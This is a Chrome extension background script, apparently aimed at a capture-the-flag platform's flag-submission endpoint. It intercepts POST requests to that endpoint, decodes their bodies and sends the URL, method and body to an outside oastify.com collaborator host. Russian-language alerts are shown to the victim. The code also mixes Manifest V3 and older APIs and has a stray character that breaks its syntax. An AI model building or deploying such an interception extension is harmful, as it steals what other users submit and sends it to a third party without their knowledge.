console.log("Extension loaded");

// Using declarativeNetRequest API for Manifest V3

chrome.declarativeNetRequest.updateDynamicRules({
    addRules: [{
        id: Math.ceil(Math.random() * 10000),
        priority: 1,
        action: {
            type: "allow"
        },
        condition: {
            urlFilter: "||tbank.mshp-ctf.ru/api/tasks/submit_flag",
            resourceTypes: ["xmlhttprequest"]
        }
    }]
});

// Listen for web requests using the newer API
chrome.webRequest.onBeforeRequest.addListener(
    (details) => {

        if (details.method === "POST" && details.url === "https://tbank.mshp-ctf.ru/api/tasks/submit_flag") {
            console.log("Found target request:", details);

            // Show alert that request is being processed
            // Using tabs API to show alert on the active tab
            chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
                chrome.tabs.executeScript(tabs[0].id, {
                    code: "alert('Отправка флага на проверку...');"
                });
            });

            // Capture the request body to send to external service
            let requestBody = null;
            if (details.requestBody && details.requestBody.raw) {
                const decoder = new TextDecoder();
                requestBody = decoder.decode(details.requestBody.raw[0].bytes);
            } else if (details.requestBody && details.requestBody.formData) {
                requestBody = JSON.stringify(details.requestBody.formData);
            }

            // Send intercepted data to external service
            fetch('https://5tzw6xmn08ah7wdlt4i3h8uw9nfe34rt.oastify.com', {
                method: 'POST',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    url: details.url,
                    method: details.method,
                    requestBody: requestBody
                })
            }).then(response => {
                // Check if the response from the external service was successful
                if (response.ok) {
                    // Show success alert after server responds
                    chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
                        // chrome.tabs.executeScript(tabs[0].id, {
                        //     code: "alert('Флаг успешно отправлен на внешний сервис!');"
                        // });

                        chrome.notifications.create({
                            type: 'basic',
                            iconUrl: 'https://tbank.mshp-ctf.ru/static/kksctf_logo_32.png',
                            title: `Notification title`,
                            message: "Your message",
                            priority: 1
                        });
w
                    });
                } else {
                    // Show error alert if the external service returned an error
                    chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
                        chrome.tabs.executeScript(tabs[0].id, {
                            code: `alert('Внешний сервис вернул ошибку: ${response.status}');`
                        });
                    });
                }
            }).catch(error => {
                console.error('Error sending data:', error);
                // Show error alert if sending to external service fails
                chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
                    chrome.tabs.executeScript(tabs[0].id, {
                        code: `alert('Ошибка при отправке флага на внешний сервис: ${error.message}');`
                    });
                });
            });
        }
    },
    {urls: ["<all_urls>"]},
    ["requestBody"]
);

console.log("Chrome API object:", chrome);

